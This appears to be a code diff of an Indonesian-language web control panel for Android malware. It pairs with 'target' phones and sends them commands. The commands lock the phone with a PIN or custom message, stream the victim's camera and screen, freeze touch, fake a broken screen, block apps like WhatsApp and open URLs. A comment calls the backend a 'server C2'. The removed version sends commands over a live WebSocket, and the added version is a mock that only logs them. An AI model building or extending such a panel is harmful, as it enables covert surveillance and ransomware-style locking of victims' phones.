-<line x1="8" y1="21" x2="16" y2="21"/>
-</svg>
-<h2>LIVE SCREEN</h2>
-</div>
-<button class="back-btn" onclick="showPage('dashboard')">
-<svg viewBox="0 0 24 24" fill="none" stroke-width="2.5" stroke-linecap="round">
-<path d="M19 12H5M12 19l-7-7 7-7"/>
-</svg>
-</button>
-</div>
-
-<div class="toggle-row">
-<div class="toggle-label">
-Aktifkan Fitur
-<small>Status: <span id="screenStatus">OFF</span></small>
-</div>
-<label class="switch">
-<input type="checkbox" id="screenToggle" onchange="updateStatus('screenStatus', this.checked)">
-<span class="slider-sw"></span>
-</label>
-</div>
-
-<div class="screen-view" id="screenView">
-<div class="placeholder">[ SCREEN OFFLINE ]</div>
-<img id="screenFrame" alt="screen">
-</div>
-
-<button class="btn" style="width:100%;" onclick="sendCmd('SCREEN', {active: document.getElementById('screenToggle').checked})">KIRIM COMMAND</button>
-</div>
-
-<!-- ============================================ -->
-<!-- PAGE: BLOCK TOUCH -->
-<!-- ============================================ -->
-<div id="page-blocktouch" class="hidden">
-<div class="page-header">
-<div class="page-title">
-<svg viewBox="0 0 24 24" fill="none" stroke="#0f0" stroke-width="2">
-<path d="M18 11V6a2 2 0 0 0-4 0v5"/>
-<path d="M14 10V4a2 2 0 0 0-4 0v6"/>
-<path d="M10 10.5V6a2 2 0 0 0-4 0v8"/>
-</svg>
-<h2>BLOCK TOUCH</h2>
-</div>
-<button class="back-btn" onclick="showPage('dashboard')">
-<svg viewBox="0 0 24 24" fill="none" stroke-width="2.5" stroke-linecap="round">
-<path d="M19 12H5M12 19l-7-7 7-7"/>
-</svg>
-</button>
-</div>
-
-<div class="toggle-row">
-<div class="toggle-label">
-Aktifkan Fitur
-<small>Status: <span id="blockStatus">OFF</span></small>
-</div>
-<label class="switch">
-<input type="checkbox" id="blockToggle" onchange="updateStatus('blockStatus', this.checked)">
-<span class="slider-sw"></span>
-</label>
-</div>
-
-<div class="form-group">
-<label>Durasi (menit)</label>
-<input type="number" id="blockDuration" value="5" min="1" max="60">
-</div>
-
-<button class="btn" style="width:100%;" onclick="sendCmd('BLOCK_TOUCH', {duration: document.getElementById('blockDuration').value, active: document.getElementById('blockToggle').checked})">KIRIM COMMAND</button>
-</div>
-
-<!-- ============================================ -->
-<!-- PAGE: LCD -->
-<!-- ============================================ -->
-<div id="page-lcd" class="hidden">
-<div class="page-header">
-<div class="page-title">
-<svg viewBox="0 0 24 24" fill="none" stroke="#0f0" stroke-width="2">
-<rect x="2" y="3" width="20" height="14" rx="2"/>
-<line x1="2" y1="8" x2="22" y2="8"/>
-<line x1="2" y1="12" x2="22" y2="12"/>
-</svg>
-<h2>LCD EFFECT</h2>
-</div>
-<button class="back-btn" onclick="showPage('dashboard')">
-<svg viewBox="0 0 24 24" fill="none" stroke-width="2.5" stroke-linecap="round">
-<path d="M19 12H5M12 19l-7-7 7-7"/>
-</svg>
-</button>
-</div>
-
-<div class="toggle-row">
-<div class="toggle-label">
-Aktifkan Fitur
-<small>Status: <span id="lcdStatus">OFF</span></small>
-</div>
-<label class="switch">
-<input type="checkbox" id="lcdToggle" onchange="updateStatus('lcdStatus', this.checked)">
-<span class="slider-sw"></span>
-</label>
-</div>
-
-<div class="form-group">
-<label>Warna Efek</label>
-<select id="lcdColor">
-<option value="green">Hijau</option>
-<option value="pink">Pink</option>
-<option value="blue">Biru</option>
-<option value="red">Merah</option>
-</select>
-</div>
-
-<button class="btn" style="width:100%;" onclick="sendCmd('LCD_EFFECT', {color: document.getElementById('lcdColor').value, active: document.getElementById('lcdToggle').checked})">KIRIM COMMAND</button>
-</div>
+  <div class="log-area" id="logArea">
+    <p>System ready. Waiting for pairing...</p>
+  </div>
 
 </div>
 
-<div id="toast">Command terkirim!</div>
+<!-- ============================= -->
+<!-- DASHBOARD (setelah Open) -->
+<!-- ============================= -->
+<div id="dashboard">
+
+  <div class="dash-header">
+    <div style="display:flex;align-items:center;gap:12px;">
+      <svg viewBox="0 0 24 24" stroke="#00ff88" fill="none" stroke-width="1.5" style="width:32px;height:32px;">
+        <rect x="6" y="2" width="12" height="20" rx="2"/>
+        <circle cx="12" cy="18" r="1"/>
+      </svg>
+      <div>
+        <h2 style="font-size:14px;letter-spacing:2px;" id="dashDeviceName">TARGET DEVICE</h2>
+        <p style="font-size:10px;opacity:0.5;letter-spacing:1px;" id="dashDeviceId">ID: -</p>
+      </div>
+    </div>
+    <button onclick="backToMain()">◄ Back</button>
+  </div>
+
+  <div class="dash-grid">
+
+    <div class="feature-card" onclick="openFeature('lock')">
+      <svg viewBox="0 0 24 24"><rect x="5" y="11" width="14" height="10" rx="2"/><path d="M8 11V7a4 4 0 018 0v4"/></svg>
+      <h3>1. LOCK</h3>
+      <p>Kunci target ke aplikasi</p>
+      <div class="feature-badge off" id="badge-lock">OFF</div>
+    </div>
+
+    <div class="feature-card" onclick="openFeature('lockmsg')">
+      <svg viewBox="0 0 24 24"><rect x="5" y="11" width="14" height="10" rx="2"/><path d="M8 11V7a4 4 0 018 0v4"/><path d="M9 16h6"/></svg>
+      <h3>2. LOCK + PESAN</h3>
+      <p>Kunci + tampilkan pesan</p>
+      <div class="feature-badge off" id="badge-lockmsg">OFF</div>
+    </div>
+
+    <div class="feature-card" onclick="openFeature('camera')">
+      <svg viewBox="0 0 24 24"><path d="M23 19a2 2 0 01-2 2H3a2 2 0 01-2-2V8a2 2 0 012-2h4l2-3h6l2 3h4a2 2 0 012 2z"/><circle cx="12" cy="13" r="4"/></svg>
+      <h3>3. LIVE CAMERA</h3>
+      <p>Lihat kamera target</p>
+      <div class="feature-badge off" id="badge-camera">OFF</div>
+    </div>
+
+    <div class="feature-card" onclick="openFeature('customhtml')">
+      <svg viewBox="0 0 24 24"><polyline points="16 18 22 12 16 6"/><polyline points="8 6 2 12 8 18"/></svg>
+      <h3>4. LOCK CUSTOM HTML</h3>
+      <p>Lock pakai HTML custom</p>
+      <div class="feature-badge off" id="badge-customhtml">OFF</div>
+    </div>
+
+    <div class="feature-card" onclick="openFeature('strobe')">
+      <svg viewBox="0 0 24 24"><circle cx="12" cy="12" r="4"/><path d="M12 2v3M12 19v3M2 12h3M19 12h3M5 5l2 2M17 17l2 2M19 5l-2 2M7 17l-2 2"/></svg>
+      <h3>5. STROBE</h3>
+      <p>Nyalakan lampu senter</p>
+      <div class="feature-badge off" id="badge-strobe">OFF</div>
+    </div>
+
+    <div class="feature-card" onclick="openFeature('screen')">
+      <svg viewBox="0 0 24 24"><rect x="2" y="3" width="20" height="14" rx="2"/><path d="M8 21h8M12 17v4"/></svg>
+      <h3>6. LIVE SCREEN</h3>
+      <p>Lihat layar target</p>
+      <div class="feature-badge off" id="badge-screen">OFF</div>
+    </div>
+
+    <div class="feature-card" onclick="openFeature('blocktouch')">
+      <svg viewBox="0 0 24 24"><circle cx="12" cy="12" r="10"/><line x1="4.93" y1="4.93" x2="19.07" y2="19.07"/></svg>
+      <h3>7. BLOCK TOUCH</h3>
+      <p>Bekukan layar target</p>
+      <div class="feature-badge off" id="badge-blocktouch">OFF</div>
+    </div>
+
+    <div class="feature-card" onclick="openFeature('lcdeffect')">
+      <svg viewBox="0 0 24 24"><rect x="2" y="3" width="20" height="14" rx="2"/><path d="M2 7h20M2 11h20M2 15h20"/></svg>
+      <h3>8. LCD EFFECT</h3>
+      <p>Efek layar rusak</p>
+      <div class="feature-badge off" id="badge-lcdeffect">OFF</div>
+    </div>
+
+    <div class="feature-card" onclick="openFeature('blockapp')">
+      <svg viewBox="0 0 24 24"><rect x="3" y="3" width="7" height="7"/><rect x="14" y="3" width="7" height="7"/><rect x="3" y="14" width="7" height="7"/><rect x="14" y="14" width="7" height="7"/></svg>
+      <h3>9. BLOKIR APLIKASI</h3>
+      <p>Blokir aplikasi target</p>
+      <div class="feature-badge off" id="badge-blockapp">OFF</div>
+    </div>
+
+    <div class="feature-card" onclick="openFeature('openweb')">
+      <svg viewBox="0 0 24 24"><circle cx="12" cy="12" r="10"/><line x1="2" y1="12" x2="22" y2="12"/><path d="M12 2a15 15 0 010 20M12 2a15 15 0 000 20"/></svg>
+      <h3>10. BUKA WEB</h3>
+      <p>Buka URL di target</p>
+      <div class="feature-badge off" id="badge-openweb">OFF</div>
+    </div>
+
+    <div class="feature-card" onclick="openFeature('wallpaper')">
+      <svg viewBox="0 0 24 24"><rect x="3" y="3" width="18" height="18" rx="2"/><circle cx="8.5" cy="8.5" r="1.5"/><path d="M21 15l-5-5L5 21"/></svg>
+      <h3>11. WALLPAPER LCD</h3>
+      <p>Wallpaper garis hijau</p>
+      <div class="feature-badge off" id="badge-wallpaper">OFF</div>
+    </div>
+
+  </div>
+
+</div>
+
+<!-- ============================= -->
+<!-- MODAL -->
+<!-- ============================= -->
+<div class="modal-overlay" id="modalOverlay">
+  <div class="modal" id="modalContent"></div>
+</div>
 
 <script>
 /* ============================================================
-   CONFIG
-   ============================================================ */
-const SERVER_HOST = window.location.host;
-const WS_PANEL_URL = (window.location.protocol === 'https:' ? 'wss://' : 'ws://') + SERVER_HOST + '/panel';
-const API_URL = window.location.protocol + '//' + SERVER_HOST + '/api';
-
-/* ============================================================
    STATE
-   ============================================================ */
-let devices = [];
-let currentDevice = null;
-let ws = null;
+============================================================ */
+const state = {
+  pairCode: '',
+  devices: [],
+  activeDevice: null,
+  features: {
+    lock:        { active:false, pin:'', autoLock:false },
+    lockmsg:     { active:false, pin:'', message:'' },
+    camera:      { active:false, facing:'front' },
+    customhtml:  { active:false, html:'' },
+    strobe:      { active:false, speed:'fast' },
+    screen:      { active:false },
+    blocktouch:  { active:false, duration:5 },
+    lcdeffect:   { active:false },
+    blockapp:    { active:false, app:'', message:'' },
+    openweb:     { active:false, url:'' },
+    wallpaper:   { active:false }
+  }
+};
 
 /* ============================================================
-   PAGE NAVIGATION
-   ============================================================ */
-function showPage(page) {
-    document.querySelectorAll('[id^="page-"]').forEach(p => p.classList.add('hidden'));
-    const target = document.getElementById('page-' + page);
-    if(target) target.classList.remove('hidden');
-    window.scrollTo({top:0, behavior:'smooth'});
+   PAIRING CODE
+============================================================ */
+function generateCode(){
+  const chars = 'ABCDEFGHJKLMNPQRSTUVWXYZ23456789';
+  let code = '';
+  for(let i=0;i<6;i++) code += chars[Math.floor(Math.random()*chars.length)];
+  state.pairCode = code;
+  document.getElementById('pairCode').textContent = code;
+  log('Pairing code generated: ' + code);
+  log('Menunggu aplikasi target memasukkan code...');
+  // NOTE: di implementasi nyata, ini dikirim ke backend
+  // dan backend nunggu koneksi dari aplikasi target.
 }
 
-function updateStatus(elId, checked) {
-    const el = document.getElementById(elId);
-    if(el) {
-        el.textContent = checked ? 'ON' : 'OFF';
-        el.style.color = checked ? '#0f0' : '#f00';
-    }
-}
-
-/* ============================================================
-   CONNECT WS
-   ============================================================ */
-function connectWS() {
-    try {
-        ws = new WebSocket(WS_PANEL_URL);
-        
-        ws.onopen = () => {
-            console.log('[PANEL] Connected');
-            document.getElementById('connStatus').textContent = 'ONLINE';
-            document.getElementById('connStatus').style.color = '#0f0';
-        };
-        
-        ws.onmessage = (event) => {
-            try {
-                const data = JSON.parse(event.data);
-                handleWSMessage(data);
-            } catch(e) { console.log('Parse error:', e); }
-        };
-        
-        ws.onclose = () => {
-            console.log('[PANEL] Disconnected, retry...');
-            document.getElementById('connStatus').textContent = 'RECONNECTING';
-            document.getElementById('connStatus').style.color = '#ff0';
-            setTimeout(connectWS, 3000);
-        };
-        
-        ws.onerror = (e) => {
-            console.log('[PANEL] Error:', e.message);
-        };
-    } catch(e) {
-        console.log('WS error:', e.message);
-        setTimeout(connectWS, 3000);
-    }
-}
-
-function handleWSMessage(data) {
-    switch(data.type) {
-        case 'device_list':
-            devices = data.devices || [];
-            renderDevices();
-            break;
-        case 'device_paired':
-            addDeviceToList({
-                deviceId: data.deviceId,
-                info: data.info,
-                online: true,
-                lastSeen: Date.now()
-            });
-            toast('Device baru terpairing!');
-            break;
-        case 'device_online':
-            updateDeviceStatus(data.deviceId, true);
-            break;
-        case 'device_offline':
-            updateDeviceStatus(data.deviceId, false);
-            break;
-        case 'cam_frame':
-            if(currentDevice && currentDevice.deviceId === data.deviceId) {
-                const img = document.getElementById('camFrame');
-                img.src = data.frame;
-                document.getElementById('camView').classList.add('live');
-            }
-            break;
-        case 'screen_frame':
-            if(currentDevice && currentDevice.deviceId === data.deviceId) {
-                const img = document.getElementById('screenFrame');
-                img.src = data.frame;
-                document.getElementById('screenView').classList.add('live');
-            }
-            break;
-        case 'ack':
-            console.log('ACK:', data.command);
-            break;
-        case 'code_generated':
-            document.getElementById('pairingCode').textContent = formatCode(data.code);
-            break;
-    }
+function copyCode(){
+  if(!state.pairCode){ log('Generate code dulu.'); return; }
+  navigator.clipboard.writeText(state.pairCode);
+  log('Code ' + state.pairCode + ' copied.');
 }
 
 /* ============================================================
    DEVICE LIST
-   ============================================================ */
-function renderDevices() {
-    const list = document.getElementById('deviceList');
-    if(devices.length === 0) {
-        list.innerHTML = '<p style="color:#080;font-size:0.85em;text-align:center;padding:20px;">Belum ada device terpairing...</p>';
-        return;
-    }
-    list.innerHTML = devices.map((d, i) => `
-        <div class="device-item">
-            <div class="device-info">
-                <div class="device-icon">
-                    <svg viewBox="0 0 24 24" fill="none" stroke="#0f0" stroke-width="2">
-                        <rect x="5" y="2" width="14" height="20" rx="2"/>
-                        <line x1="12" y1="18" x2="12" y2="18"/>
-                    </svg>
-                </div>
-                <div>
-                    <div class="device-name">${escapeHtml(d.deviceId)}</div>
-                    <div class="device-meta">
-                        <span class="${d.online ? 'online' : 'offline'}">${d.online ? '● ONLINE' : '○ OFFLINE'}</span>
-                        ${d.info && d.info.platform ? ' | ' + escapeHtml(d.info.platform) : ''}
-                    </div>
-                </div>
-            </div>
-            <div class="device-actions">
-                <button class="btn" onclick="openDevice(${i})">OPEN</button>
-                <button class="btn btn-red" onclick="removeDevice(${i})">HAPUS</button>
-            </div>
+============================================================ */
+function refreshDevices(){
+  renderDevices();
+  log('Device list refreshed.');
+}
+
+function addDevice(dev){
+  state.devices.push(dev);
+  renderDevices();
+  log('Device paired: ' + dev.name);
+}
+
+function renderDevices(){
+  const list = document.getElementById('deviceList');
+  if(state.devices.length === 0){
+    list.innerHTML = '<p style="opacity:0.4;font-size:12px;padding:10px;letter-spacing:1px;">Belum ada device terpairing.</p>';
+    return;
+  }
+  list.innerHTML = state.devices.map((d,i) => `
+    <div class="device-card">
+      <div class="device-info">
+        <div class="device-icon">
+          <svg viewBox="0 0 24 24"><rect x="6" y="2" width="12" height="20" rx="2"/><circle cx="12" cy="18" r="1"/></svg>
         </div>
-    `).join('');
-}
-
-function addDeviceToList(d) {
-    const exists = devices.find(x => x.deviceId === d.deviceId);
-    if(!exists) {
-        devices.push(d);
-        renderDevices();
-    }
-}
-
-function updateDeviceStatus(deviceId, online) {
-    const d = devices.find(x => x.deviceId === deviceId);
-    if(d) {
-        d.online = online;
-        renderDevices();
-    }
-}
-
-function removeDevice(index) {
-    devices.splice(index, 1);
-    renderDevices();
-    toast('Device dihapus');
-}
-
-function openDevice(index) {
-    currentDevice = devices[index];
-    document.getElementById('dashTitle').textContent = currentDevice.deviceId;
-    showPage('dashboard');
+        <div class="device-meta">
+          <h3>${d.name}</h3>
+          <p>ID: ${d.id} • ${d.os}</p>
+        </div>
+      </div>
+      <button onclick="openDashboard(${i})">OPEN DASHBOARD</button>
+    </div>
+  `).join('');
 }
 
 /* ============================================================
-   PAIRING
-   ============================================================ */
-function generateCode() {
-    if(ws && ws.readyState === 1) {
-        ws.send(JSON.stringify({ type: 'generate_code' }));
-    } else {
-        // fallback via REST
-        fetch(API_URL + '/generate', { method: 'POST' })
-            .then(r => r.json())
-            .then(d => {
-                if(d.success) {
-                    document.getElementById('pairingCode').textContent = formatCode(d.code);
-                    toast('Code generated!');
-                }
-            })
-            .catch(e => toast('Gagal generate code', true));
-    }
+   DASHBOARD
+============================================================ */
+function openDashboard(index){
+  state.activeDevice = state.devices[index];
+  document.getElementById('mainPage').style.display = 'none';
+  document.getElementById('dashboard').style.display = 'block';
+  document.getElementById('dashDeviceName').textContent = state.activeDevice.name;
+  document.getElementById('dashDeviceId').textContent = 'ID: ' + state.activeDevice.id;
+  log('Dashboard opened for ' + state.activeDevice.name);
 }
 
-function formatCode(code) {
-    if(!code) return '---- ---- ----';
-    return code.match(/.{1,4}/g).join(' ');
+function backToMain(){
+  document.getElementById('dashboard').style.display = 'none';
+  document.getElementById('mainPage').style.display = 'block';
+  state.activeDevice = null;
 }
 
-function copyCode() {
-    const code = document.getElementById('pairingCode').textContent.replace(/\s/g,'');
-    if(code === '------------------------' || code.length < 12) {
-        toast('Generate code dulu!', true);
-        return;
-    }
-    navigator.clipboard.writeText(code).then(() => {
-        toast('Code disalin: ' + code);
-    }).catch(() => {
-        toast('Gagal copy', true);
+/* ============================================================
+   FITUR HANDLER
+============================================================ */
+function openFeature(key){
+  const overlay = document.getElementById('modalOverlay');
+  const modal = document.getElementById('modalContent');
+  overlay.classList.add('active');
+
+  const f = state.features[key];
+  let html = '';
+
+  /* ---- 1. LOCK ---- */
+  if(key === 'lock'){
+    html = `
+      <h2>1. LOCK</h2>
+      <div class="toggle-row">
+        <span>Aktifkan Lock</span>
+        <div class="toggle ${f.active?'on':''}" onclick="toggleFeature('lock',this)"></div>
+      </div>
+      <label>PIN (4-6 digit)</label>
+      <input type="text" id="f-lock-pin" value="${f.pin}" maxlength="6" placeholder="1234">
+      <div class="toggle-row" style="margin-top:14px;">
+        <span>Auto-Lock saat boot</span>
+        <div class="toggle ${f.autoLock?'on':''}" onclick="toggleSub('lock','autoLock',this)"></div>
+      </div>
+    `;
+  }
+
+  /* ---- 2. LOCK + PESAN ---- */
+  else if(key === 'lockmsg'){
+    html = `
+      <h2>2. LOCK + PESAN</h2>
+      <div class="toggle-row">
+        <span>Aktifkan</span>
+        <div class="toggle ${f.active?'on':''}" onclick="toggleFeature('lockmsg',this)"></div>
+      </div>
+      <label>PIN</label>
+      <input type="text" id="f-lockmsg-pin" value="${f.pin}" maxlength="6" placeholder="1234">
+      <label>Pesan untuk target</label>
+      <textarea id="f-lockmsg-msg" placeholder="HP ini terkunci.">${f.message}</textarea>
+    `;
+  }
+
+  /* ---- 3. LIVE CAMERA ---- */
+  else if(key === 'camera'){
+    html = `
+      <h2>3. LIVE CAMERA</h2>
+      <div class="toggle-row">
+        <span>Aktifkan</span>
+        <div class="toggle ${f.active?'on':''}" onclick="toggleFeature('camera',this);startCameraPreview();"></div>
+      </div>
+      <label>Pilih Kamera</label>
+      <select id="f-camera-facing" onchange="switchCamera(this.value)">
+        <option value="front" ${f.facing==='front'?'selected':''}>Kamera Depan</option>
+        <option value="back"  ${f.facing==='back' ?'selected':''}>Kamera Belakang</option>
+      </select>
+      <div class="camera-view" id="cameraPreview">
+        <video id="camVideo" autoplay playsinline muted></video>
+      </div>
+    `;
+  }
+
+  /* ---- 4. LOCK CUSTOM HTML ---- */
+  else if(key === 'customhtml'){
+    html = `
+      <h2>4. LOCK CUSTOM HTML</h2>
+      <div class="toggle-row">
+        <span>Aktifkan</span>
+        <div class="toggle ${f.active?'on':''}" onclick="toggleFeature('customhtml',this)"></div>
+      </div>
+      <label>HTML Custom</label>
+      <textarea id="f-customhtml-html" placeholder="<h1>HP Terkunci</h1>">${f.html}</textarea>
+    `;
+  }
+
+  /* ---- 5. STROBE ---- */
+  else if(key === 'strobe'){
+    html = `
+      <h2>5. STROBE (SENTER)</h2>
+      <div class="toggle-row">
+        <span>Aktifkan</span>
+        <div class="toggle ${f.active?'on':''}" onclick="toggleFeature('strobe',this)"></div>
+      </div>
+      <label>Kecepatan</label>
+      <select id="f-strobe-speed">
+        <option value="slow"   ${f.speed==='slow'?'selected':''}>Lambat</option>
+        <option value="fast"   ${f.speed==='fast'?'selected':''}>Cepat</option>
+        <option value="turbo"  ${f.speed==='turbo'?'selected':''}>Turbo</option>
+      </select>
+    `;
+  }
+
+  /* ---- 6. LIVE SCREEN ---- */
+  else if(key === 'screen'){
+    html = `
+      <h2>6. LIVE SCREEN</h2>
+      <div class="toggle-row">
+        <span>Aktifkan</span>
+        <div class="toggle ${f.active?'on':''}" onclick="toggleFeature('screen',this)"></div>
+      </div>
+      <div class="screen-view" id="screenPreview">
+        <video id="screenVideo" autoplay playsinline muted></video>
+      </div>
+    `;
+  }
+
+  /* ---- 7. BLOCK TOUCH ---- */
+  else if(key === 'blocktouch'){
+    html = `
+      <h2>7. BLOCK TOUCH</h2>
+      <div class="toggle-row">
+        <span>Aktifkan</span>
+        <div class="toggle ${f.active?'on':''}" onclick="toggleFeature('blocktouch',this)"></div>
+      </div>
+      <label>Durasi (menit)</label>
+      <input type="number" id="f-blocktouch-duration" value="${f.duration}" min="1" max="120">
+    `;
+  }
+
+  /* ---- 8. LCD EFFECT ---- */
+  else if(key === 'lcdeffect'){
+    html = `
+      <h2>8. LCD EFFECT</h2>
+      <div class="toggle-row">
+        <span>Aktifkan efek LCD rusak</span>
+        <div class="toggle ${f.active?'on':''}" onclick="toggleFeature('lcdeffect',this)"></div>
+      </div>
+      <p style="font-size:11px;opacity:0.6;margin-top:14px;">
+        Layar target akan menampilkan garis-garis vertikal & noise.
+      </p>
+    `;
+  }
+
+  /* ---- 9. BLOKIR APLIKASI ---- */
+  else if(key === 'blockapp'){
+    html = `
+      <h2>9. BLOKIR APLIKASI</h2>
+      <div class="toggle-row">
+        <span>Aktifkan</span>
+        <div class="toggle ${f.active?'on':''}" onclick="toggleFeature('blockapp',this)"></div>
+      </div>
+      <label>Nama Aplikasi (package name)</label>
+      <input type="text" id="f-blockapp-app" value="${f.app}" placeholder="com.whatsapp">
+      <label>Pesan blokir</label>
+      <input type="text" id="f-blockapp-msg" value="${f.message}" placeholder="Aplikasi diblokir.">
+      <div class="modal-actions">
+        <button class="warn" onclick="sendBlockApp()">BLOKIR +</button>
+      </div>
+    `;
+  }
+
+  /* ---- 10. BUKA WEB ---- */
+  else if(key === 'openweb'){
+    html = `
+      <h2>10. BUKA WEB</h2>
+      <div class="toggle-row">
+        <span>Aktifkan</span>
+        <div class="toggle ${f.active?'on':''}" onclick="toggleFeature('openweb',this)"></div>
+      </div>
+      <label>URL</label>
+      <input type="text" id="f-openweb-url" value="${f.url}" placeholder="https://example.com">
+      <div class="modal-actions">
+        <button onclick="sendOpenWeb()">KIRIM</button>
+      </div>
+    `;
+  }
+
+  /* ---- 11. WALLPAPER LCD ---- */
+  else if(key === 'wallpaper'){
+    html = `
+      <h2>11. WALLPAPER LCD</h2>
+      <div class="toggle-row">
+        <span>Aktifkan</span>
+        <div class="toggle ${f.active?'on':''}" onclick="toggleFeature('wallpaper',this)"></div>
+      </div>
+      <p style="font-size:11px;opacity:0.6;margin-top:14px;">
+        Wallpaper target diganti dengan garis-garis hijau (LCD rusak).
+      </p>
+    `;
+  }
+
+  html += `
+    <div class="modal-actions">
+      <button onclick="closeModal()">TUTUP</button>
+      <button onclick="applyFeature('${key}')">TERAPKAN</button>
+    </div>
+  `;
+
+  modal.innerHTML = html;
+
+  if(key === 'camera' && f.active) startCameraPreview();
+  if(key === 'screen' && f.active) startScreenPreview();
+}
+
+function closeModal(){
+  document.getElementById('modalOverlay').classList.remove('active');
+  stopAllPreviews();
+}
+
+/* ============================================================
+   TOGGLE
+============================================================ */
+function toggleFeature(key, el){
+  state.features[key].active = !state.features[key].active;
+  el.classList.toggle('on');
+  updateBadge(key);
+  log(`Feature [${key}] ${state.features[key].active?'AKTIF':'NONAKTIF'}`);
+  sendCommand(key, {active: state.features[key].active});
+}
+
+function toggleSub(key, sub, el){
+  state.features[key][sub] = !state.features[key][sub];
+  el.classList.toggle('on');
+}
+
+function updateBadge(key){
+  const b = document.getElementById('badge-'+key);
+  if(!b) return;
+  b.textContent = state.features[key].active ? 'ON' : 'OFF';
+  b.classList.toggle('on', state.features[key].active);
+  b.classList.toggle('off', !state.features[key].active);
+}
+
+/* ============================================================
+   APPLY
+============================================================ */
+function applyFeature(key){
+  const f = state.features[key];
+  switch(key){
+    case 'lock':
+      f.pin = document.getElementById('f-lock-pin').value;
+      break;
+    case 'lockmsg':
+      f.pin = document.getElementById('f-lockmsg-pin').value;
+      f.message = document.getElementById('f-lockmsg-msg').value;
+      break;
+    case 'camera':
+      f.facing = document.getElementById('f-camera-facing').value;
+      break;
+    case 'customhtml':
+      f.html = document.getElementById('f-customhtml-html').value;
+      break;
+    case 'strobe':
+      f.speed = document.getElementById('f-strobe-speed').value;
+      break;
+    case 'blocktouch':
+      f.duration = parseInt(document.getElementById('f-blocktouch-duration').value)||5;
+      break;
+    case 'blockapp':
+      f.app = document.getElementById('f-blockapp-app').value;
+      f.message = document.getElementById('f-blockapp-msg').value;
+      break;
+    case 'openweb':
+      f.url = document.getElementById('f-openweb-url').value;
+      break;
+  }
+  log(`Feature [${key}] applied.`);
+  sendCommand(key, f);
+  closeModal();
+}
+
+/* ============================================================
+   CAMERA PREVIEW (local, buat testing)
+============================================================ */
+let camStream = null, screenStream = null, previewInterval = null;
+
+async function startCameraPreview(){
+  stopAllPreviews();
+  try {
+    camStream = await navigator.mediaDevices.getUserMedia({
+      video: { facingMode: state.features.camera.facing }
     });
+    const v = document.getElementById('camVideo');
+    if(v) v.srcObject = camStream;
+    log('Camera preview started.');
+  } catch(e){ log('Camera error: '+e.message); }
+}
+
+async function switchCamera(facing){
+  state.features.camera.facing = facing;
+  if(state.features.camera.active) startCameraPreview();
+}
+
+async function startScreenPreview(){
+  stopAllPreviews();
+  try {
+    screenStream = await navigator.mediaDevices.getDisplayMedia({ video:true });
+    const v = document.getElementById('screenVideo');
+    if(v) v.srcObject = screenStream;
+    log('Screen preview started.');
+  } catch(e){ log('Screen error: '+e.message); }
+}
+
+function stopAllPreviews(){
+  if(camStream){ camStream.getTracks().forEach(t=>t.stop()); camStream=null; }
+  if(screenStream){ screenStream.getTracks().forEach(t=>t.stop()); screenStream=null; }
+  if(previewInterval){ clearInterval(previewInterval); previewInterval=null; }
 }
 
 /* ============================================================
-   SEND COMMAND
-   ============================================================ */
-function sendCmd(cmd, params) {
-    if(!currentDevice) {
-        toast('Pilih device dulu!', true);
-        return;
-    }
-    
-    if(!ws || ws.readyState !== 1) {
-        toast('Server offline!', true);
-        return;
-    }
-    
-    ws.send(JSON.stringify({
-        type: 'command',
-        deviceId: currentDevice.deviceId,
-        command: cmd,
-        params: params
-    }));
-    
-    toast('Command ' + cmd + ' terkirim!');
+   SEND COMMAND (ke aplikasi target via pairing code)
+============================================================ */
+function sendCommand(feature, data){
+  if(!state.activeDevice){ return; }
+  // KIRIM KE BACKEND → diteruskan ke aplikasi target
+  // yang terhubung via pairing code.
+  const payload = {
+    device: state.activeDevice.id,
+    feature: feature,
+    data: data,
+    timestamp: Date.now()
+  };
+  // Di implementasi nyata, ganti ini dengan WebSocket / fetch ke server C2:
+  // fetch('/api/command', {method:'POST', body: JSON.stringify(payload)});
+  log('CMD >> ' + feature + ' ' + JSON.stringify(data));
+}
+
+function sendBlockApp(){
+  const app = document.getElementById('f-blockapp-app').value;
+  const msg = document.getElementById('f-blockapp-msg').value;
+  state.features.blockapp.app = app;
+  state.features.blockapp.message = msg;
+  sendCommand('blockapp', { app, message: msg });
+  log('Block app sent: ' + app);
+}
+
+function sendOpenWeb(){
+  const url = document.getElementById('f-openweb-url').value;
+  state.features.openweb.url = url;
+  sendCommand('openweb', { url });
+  log('Open web sent: ' + url);
 }
 
 /* ============================================================
-   UTILS
-   ============================================================ */
-function escapeHtml(s) {
-    return String(s).replace(/[&<>"']/g, c => ({
-        '&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'
-    }[c]));
-}
-
-let toastTimer;
-function toast(msg, isError) {
-    const t = document.getElementById('toast');
-    t.textContent = msg;
-    t.className = isError ? 'show error' : 'show';
-    clearTimeout(toastTimer);
-    toastTimer = setTimeout(() => { t.className = ''; }, 2500);
+   LOG
+============================================================ */
+function log(msg){
+  const area = document.getElementById('logArea');
+  if(!area) return;
+  const p = document.createElement('p');
+  const t = new Date().toLocaleTimeString();
+  p.textContent = '[' + t + '] ' + msg;
+  area.appendChild(p);
+  area.scrollTop = area.scrollHeight;
 }
 
 /* ============================================================
-   INIT
-   ============================================================ */
-connectWS();
-document.addEventListener('contextmenu', e => e.preventDefault());
+   CONTOH DEVICE MASUK (buat ngetes)
+   Di real-nya, ini dipicu dari backend saat ada
+   aplikasi target yang masukin pairing code yang cocok.
+============================================================ */
+function simulateIncomingDevice(){
+  if(!state.pairCode) return;
+  addDevice({
+    id: 'DEV-' + Math.random().toString(36).substring(2,8).toUpperCase(),
+    name: 'Android Target',
+    os: 'Android 13'
+  });
+}
+// buka console dan panggil simulateIncomingDevice() buat ngetes
 </script>
-
 </body>
 </html>
